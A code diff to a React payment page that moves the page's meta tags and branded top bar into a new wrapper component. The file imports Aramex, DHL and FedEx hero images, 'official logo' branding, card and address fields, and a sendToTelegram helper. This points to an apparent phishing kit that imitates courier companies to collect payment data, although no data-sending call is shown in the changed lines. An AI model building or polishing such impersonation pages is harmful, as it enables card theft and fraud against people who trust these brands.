@@ -15,6 +15,7 @@ import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
 import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin } from "lucide-react";
+import { PaymentPageWrapper } from "@/components/PaymentPageWrapper";
 import heroAramex from "@/assets/hero-aramex.jpg";
 import heroDhl from "@/assets/hero-dhl.jpg";
 import heroFedex from "@/assets/hero-fedex.jpg";
@@ -203,35 +204,16 @@ const PaymentRecipient = () => {
   };
   
   return (
-    <>
-      <PaymentMetaTags
-        serviceName={serviceName}
-        serviceKey={serviceKey}
-        amount={formattedAmount}
-        title={dynamicTitle}
-        description={dynamicDescription}
-      />
-      {/* Dynamic OG Image via direct meta tag injection */}
-      <Helmet>
-        <meta property="og:image" content={dynamicImage} />
-        <meta name="twitter:image" content={dynamicImage} />
-      </Helmet>
-      {/* Branded Top Bar with Official Logo */}
-      <BrandedTopBar 
-        serviceKey={serviceKey}
-        serviceName={serviceName}
-        showBackButton={true}
-        showCarousel={true}
-      />
-
-      <div 
-        className="min-h-screen" 
-        dir="rtl"
-        style={{
-          background: companyBranding?.colors.background || '#FFFFFF',
-          fontFamily: companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
-        }}
-      >
+    <PaymentPageWrapper
+      serviceKey={serviceKey}
+      serviceName={serviceName}
+      showTopBar={true}
+      showCarousel={true}
+      showBackButton={true}
+      title={dynamicTitle}
+      description={dynamicDescription}
+    >
+      <div dir="rtl">
         <div className="container mx-auto px-3 sm:px-4 py-6 sm:py-8">
           
           <div className="max-w-2xl mx-auto">
@@ -365,7 +347,7 @@ const PaymentRecipient = () => {
           </div>
         </div>
       </div>
-    </>
+    </PaymentPageWrapper>
   );
 };
 
